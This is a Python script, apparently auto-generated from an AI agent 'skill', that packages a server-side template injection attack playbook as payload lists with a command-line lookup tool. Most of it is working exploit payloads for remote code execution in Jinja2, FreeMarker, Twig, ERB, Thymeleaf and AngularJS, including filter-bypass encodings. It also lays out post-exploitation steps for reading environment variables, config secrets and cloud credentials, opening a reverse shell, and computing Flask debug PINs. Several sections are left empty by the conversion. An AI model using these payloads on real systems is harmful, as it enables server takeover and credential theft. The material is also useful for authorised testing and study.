#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
AUTO-GENERATED from Cybermes skill: hack-skills/ssti-server-side-template-injection

Skill: SKILL: Server-Side Template Injection (SSTI) — Expert Attack Playbook
Desc : >-

Run:  python hack-skills-ssti-server-side-template-injection.py --help
      python hack-skills-ssti-server-side-template-injection.py --list
      python hack-skills-ssti-server-side-template-injection.py --dump <section>
"""
import sys, json, argparse

NAME = 'hack-skills/ssti-server-side-template-injection'
TITLE = 'SKILL: Server-Side Template Injection (SSTI) — Expert Attack Playbook'
DESCRIPTION = '>-'

PAYLOADS = {
    'main': ["name: ssti-server-side-template-injection", "description: >-", "SSTI playbook. Use when template expressions, server-side rendering, preview features, or templating engines may evaluate attacker-controlled content."],
    'skill-server-side-template-injection-ssti-expert-attack-playbook': [],
    '0-related-routing': ["Before using full engine-specific exploitation, you can first load:", "- First use the polyglot probe sequence at the top of this file for low-noise fingerprinting", "- [expression-language-injection](../expression-language-injection/SKILL.md) when `${7*7}` or `%{7*7}` resolves in Java (SpEL/OGNL) \u2014 different attack surface from template engines"],
    'extended-scenarios': ["Also load [SCENARIOS.md](./SCENARIOS.md) when you need:", "- Maccms 8.x PHP template `eval` \u2014 `{if-A:phpinfo()}{endif-A}` in `vod-search`, base64 bypass for webshell write", "- Jira CVE-2019-11581 \u2014 \"Contact Administrators\" form \u2192 Velocity template injection \u2192 command output in admin email", "- Spring Cloud Gateway SpEL (CVE-2022-22947) \u2014 actuator route injection with `StreamUtils.copyToByteArray` for output capture", "- Struts2 OGNL S2-045 (CVE-2017-5638) \u2014 Content-Type header OGNL injection with `_memberAccess` / `OgnlUtil` blacklist clear", "- Confluence OGNL CVE-2021-26084 \u2014 `createpage-entervariables.action` with `\\u0027` unicode bypass", "- SSTI vs EL injection disambiguation guide", "- Additional template engines: ASP.NET Razor, Elixir EEx, PHP Smarty/Latte/Blade, JS Pug/Handlebars/Nunjucks/EJS/Lodash + universal detection + blind SSTI + Flask PIN calculation", "**SCENARIOS.md reference (\u00a77\u2013\u00a711):** For expanded payloads and engine-specific notes on Razor, EEx/LEEx/HEEx, PHP stacks, JavaScript template engines, the universal polyglot probe, mathematical fingerprinting, blind SSTI (boolean / time / OOB), and Flask debug PIN prerequisites, see [SCENARIOS.md](./SCENARIOS.md). This skill keeps a short checklist in \u00a713\u2013\u00a715."],
    'engine-payloads-reference': ["For extended engine-specific fingerprinting, payload matrices (Jinja2, Twig, Freemarker, Velocity, Pebble, Mako, Slim, Handlebars, Thymeleaf, Smarty, ERB, Jade/Pug), and blind SSTI detection techniques (timing-based, DNS-based), see [ENGINE_PAYLOADS.md](./ENGINE_PAYLOADS.md)."],
    'universal-detection-blind-ssti-pointer': ["Use the polyglot payload and math probes in \u00a71 and \u00a713 first; when you need fuller blind-test patterns and per-engine examples (including non-Python stacks), follow [SCENARIOS.md](./SCENARIOS.md) \u00a711 and cross-check \u00a714 here for technique names (boolean, time, OOB, error-based)."],
    '1-detection-polyglot-probe-sequence': ["First test: distinguish SSTI from XSS. Send these probes and check if **math is evaluated** server-side:", "{{7*7}}        \u2192 IF returns 49 (not {{7*7}}) \u2192 Jinja2 or Twig", "${7*7}         \u2192 IF returns 49 \u2192 FreeMarker, Velocity, or Java EL", "<#assign x=7*7>${x}  \u2192 FreeMarker", "@{7*7}         \u2192 Thymeleaf", "*{7*7}         \u2192 Thymeleaf SpEL (*{...})", "**Jinja2 vs Twig disambiguation**:", "{{7*'7'}}", "\u2192 7777777  = Jinja2 (Python string multiplication)", "\u2192 49       = Twig (PHP numeric)", "**Safe detection probe** (no math, just boolean):", "{{''.__class__}}   \u2192 class 'str' = Python/Jinja2"],
    '2-engine-to-language-mapping': ["Identifying language from errors \u2192 then narrow to template engine."],
    '3-jinja2-python-flask-rce-chains': [],
    'chain-1-os-module-via-globals': ["```python", "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}"],
    'chain-2-mro-subclass-traversal-sandbox-escape': ["```python"],
    'list-all-subclasses': ["{{''.__class__.__mro__[1].__subclasses__()}}"],
    'find-subprocess-popen-index-usually-around-258-270-varies-by-python-version': [],
    'look-for-subprocess-popen-in-the-list': [],
    'execute-command-replace-258-with-correct-index': ["{{''.__class__.__mro__[1].__subclasses__()[258]('id', shell=True, stdout=-1).communicate()[0]}}"],
    'chain-3-request-object-globals-works-when-config-blocked': ["```python", "{{request|attr('application')|attr('\\x5f\\x5fglobals\\x5f\\x5f')|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('\\x5f\\x5fbuiltins\\x5f\\x5f')|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('\\x5f\\x5fimport\\x5f\\x5f')('os')|attr('popen')('id')|attr('read')()}}", "(Uses hex encoding to avoid `_` filtering)"],
    'chain-4-lipsum-function-globals-flask-built-in': ["```python", "{{lipsum.__globals__.os.popen('id').read()}}"],
    'chain-5-cycler-object': ["```python", "{{cycler.__init__.__globals__.os.popen('id').read()}}"],
    'finding-correct-subprocess-index-dynamically': ["```python"],
    'in-injection': ["{% for c in ''.__class__.__mro__[1].__subclasses__() %}", "{% if 'Popen' in c.__name__ %}", "{{loop.index}}", "{% endif %}", "{% endfor %}"],
    '4-jinja2-sandbox-bypass-techniques': [],
    'when-underscore-is-blocked': ["```python"],
    'use-attr-filter-with-hex-encoding': ["''|attr('\\x5f\\x5fclass\\x5f\\x5f')"],
    'use-getattr-via-request-object': ["request|attr('args')|attr('__class__')"],
    'when-dot-is-blocked': ["```python"],
    'use-subscript-notation': ["''['__class__']", "config['SECRET_KEY']"],
    'when-keywords-class-mro-are-blocked': ["Use hex/unicode in `attr()`:", "```python"],
    'when-output-encoding-strips-html-entities': ["Use `|safe` filter to prevent auto-escaping."],
    '5-freemarker-java-rce': [],
    'execute-command-via-freemarker-template-utility-execute': ["```freemarker", "<#assign ex=\"freemarker.template.utility.Execute\"?new()>", "${ex(\"id\")}"],
    'alternative-via-objectconstructor': ["```freemarker", "<#assign ob=\"freemarker.template.utility.ObjectConstructor\"?new()>", "<#assign br=ob(\"java.io.BufferedReader\",ob(\"java.io.InputStreamReader\",ob(\"java.lang.Runtime\")?api.exec(\"id\").inputStream))>", "${br.readLine()}"],
    '6-twig-php-rce': ["```php", "// Twig 1.x (before sandbox):", "{{_self.env.registerUndefinedFilterCallback(\"exec\")}}", "{{_self.env.getFilter(\"id\")}}", "// Twig 2.x using built-ins:", "{{['id']|map('system')|join}}", "// via filter map:", "{{app.request.server.all|join(',')}}"],
    '7-velocity-java-rce': ["```velocity", "Or more directly:", "```velocity"],
    '8-erb-ruby-rails-rce': ["```ruby", "<%= system('id') %>", "<%= `id` %>", "<%= IO.popen('id').read %>", "<%= File.read('/etc/passwd') %>"],
    '9-thymeleaf-java-spring-rce': ["Thymeleaf with Spring EL (SpEL):", "```java", "// In th:text or th:fragment context:", "__${T(java.lang.Runtime).getRuntime().exec(\"id\")}__::type", "// Fragment expression context:", "__${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(new String[]{\"/bin/sh\",\"-c\",\"id\"}).getInputStream())}__::type"],
    '10-client-side-template-injection-angularjs': ["When AngularJS is used client-side and user data flows into template expressions:", "```javascript", "// AngularJS 1.x sandbox escape:", "{{constructor.constructor('alert(1)')()}}", "// 1.5.x:", "{{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=alert(1)');}}", "// 1.3.x:", "{{{}[{toString:[].join,length:1,0:'__proto__'}].assign=[].join;'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}", "**Detection**: send `{{1+1}}` \u2014 if page shows `2`, AngularJS evaluates expressions in the DOM."],
    '11-ssti-full-rce-path': ["SSTI detected \u2192 identify engine", "\u251c\u2500\u2500 Jinja2 \u2192 config.__globals__['os'].popen()", "\u2502           OR subclass traversal for Popen", "\u251c\u2500\u2500 FreeMarker \u2192 freemarker.template.utility.Execute?new()", "\u251c\u2500\u2500 Twig \u2192 _self.env.registerUndefinedFilterCallback('exec')", "\u251c\u2500\u2500 Velocity \u2192 java.lang.Runtime.exec()", "\u251c\u2500\u2500 ERB \u2192 <%= `cmd` %>", "\u251c\u2500\u2500 Thymeleaf \u2192 T(java.lang.Runtime).getRuntime().exec()", "\u2514\u2500\u2500 Angular CSTI \u2192 constructor.constructor('payload')()", "**Post-RCE pivot**:", "1. Read `/proc/self/environ` \u2014 env vars with credentials", "2. Read application config files \u2014 DB passwords, API keys", "3. `cat ~/.aws/credentials` \u2014 cloud credentials", "4. Reverse shell for persistence"],
    '12-common-injection-entry-points': ["Where user data enters templates:", "- URL path: `https://site.com/home?name={{7*7}}`", "- Query parameters: `?message=Hello`", "- HTML forms: profile name, bio, content fields", "- Error pages: `404 Not Found: /PAYLOAD`", "- Email templates: name in password reset emails", "- Inline template rendering: `render_template_string(user_input)`", "**Most dangerous**: `render_template_string()` in Flask \u2014 entire user input used as template."],
    '13-universal-detection-payloads': ["**Polyglot probe** that triggers errors or evaluation in many engines:", "${{<%[%'\"}}%\\.", "**Mathematical probes** for blind/error confirmation:", "{{7*7}}          \u2192 49 (Jinja2, Twig, Nunjucks, Handlebars)", "${7*7}           \u2192 49 (FreeMarker, Velocity, EL, Thymeleaf)", "<%= 7*7 %>       \u2192 49 (ERB, EJS, EEx)", "@(7*7)           \u2192 49 (Razor)", "{7*7}            \u2192 49 (Smarty)", "**Error-based engine fingerprint** (parser/stack traces often name the engine):", "(1/0).zxy.zxy"],
    '14-blind-ssti-techniques': ["- **Boolean-based**: Compare `(3*4/2)` vs `3*)2(/4` \u2014 if the first resolves and the second errors, evaluation is likely", "- **Time-based**: `{{sleep(5)}}` or the engine-specific equivalent for delay", "- **OOB**: DNS/HTTP callback via template expressions when direct output is not visible", "- **Error-based**: Force different error messages based on true/false conditions"],
    '15-flask-pin-calculation': ["When Flask **debug mode** (Werkzeug debugger) is exposed but **PIN-protected**, the PIN is derived from host-specific values. Typical inputs for public PIN calculation scripts:", "1. **`username`** \u2014 from `/etc/passwd` (the user running the Flask process)", "2. **Module name** \u2014 often `flask.app` or `Flask`", "3. **Application path** \u2014 `app.py` or the real main filename", "4. **MAC address** \u2014 e.g. `/sys/class/net/eth0/address`, converted to decimal as Werkzeug expects", "5. **Machine ID** \u2014 `/etc/machine-id`, or `/proc/sys/kernel/random/boot_id` combined with the first line of `/proc/self/cgroup` per Werkzeug\u2019s algorithm", "6. **Compute PIN** \u2014 use established open-source PIN calculators that implement the same algorithm from these values"],
}

def main():
    ap = argparse.ArgumentParser(description=DESCRIPTION, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--list", action="store_true", help="list sections")
    ap.add_argument("--dump", metavar="SECTION", help="dump payloads for a section")
    ap.add_argument("--search", metavar="KEYWORD", help="search payloads")
    args = ap.parse_args()
    if args.list or not (args.dump or args.search):
        print("=== %s ===" % TITLE)
        print(DESCRIPTION)
        print()
        print("Sections (%d):" % len(PAYLOADS))
        for k in PAYLOADS:
            print("  -", k, "(%d payloads)" % len(PAYLOADS[k]))
        if args.list:
            return
    if args.dump:
        if args.dump not in PAYLOADS:
            print("Section not found. Available:", list(PAYLOADS.keys()))
            sys.exit(1)
        for p in PAYLOADS[args.dump]:
            print(p)
        return
    if args.search:
        q = args.search.lower()
        hits = 0
        for k, v in PAYLOADS.items():
            for p in v:
                if q in p.lower():
                    print("[%s] %s" % (k, p))
                    hits += 1
        print("\n%d hits" % hits)
        return

if __name__ == "__main__":
    main()